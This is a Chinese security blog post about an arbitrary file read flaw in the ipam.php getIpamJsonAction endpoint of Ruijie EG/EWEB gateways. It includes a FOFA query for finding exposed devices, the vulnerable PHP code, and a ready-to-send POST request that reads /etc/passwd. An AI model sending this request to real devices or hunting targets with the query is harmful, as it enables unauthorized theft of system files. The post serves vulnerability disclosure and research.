---
title: "锐捷-EWEB ipam.php 文件读取漏洞"
source: https://mrxn.net/jswz/ruijieweb-ipam-fileread.html
asset_dir: assets/锐捷-eweb-ipam.php-文件读取漏洞
---

# 锐捷-EWEB ipam.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/4 08:20
* 1386浏览
* [0评论](#comment)
* 9分钟阅读

深入探索

编码转换工具

网络安全会议

SQL注入检测工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `ipam.php` 的 `getIpamJsonAction` 存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)读取设备上任意文件内容，造成敏感信息泄露。

漏洞修复方案

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

直接看 `ddi/server/ipam.php` 中的 `getIpamJsonAction` 方法实现

```
public function getIpamJsonAction() {
        $file = p('path');
        file_put_contents($file, iconv('gbk', 'utf-8', file_get_contents($file)));
        $content = file_get_contents($file); //读取文件中的内容
        echo $content;
    }
```

直接将无任何过滤和校验 post 获取的 `path` 直接带入 `file_get_contents` 函数中进行文件操作，导致任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

```
POST /ddi/server/ipam.php?a=getIpamJson HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

path=/etc/passwd
```

成功读取到 `/etc/passwd` 文件内容

[![锐捷-EWEB ipam.php 文件读取漏洞](images/img-001-481954e6c848.webp)](https://image.mrxn.net/dea397a414d64f5b93bfcb0bae3a5da0.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[锐捷-EWEB ipam.php 文件读取漏洞](https://mrxn.net/jswz/ruijieweb-ipam-fileread.html)  
文章链接：<https://mrxn.net/jswz/ruijieweb-ipam-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

Windows安全工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ruijieweb-ipam-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ruijieweb-ipam-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 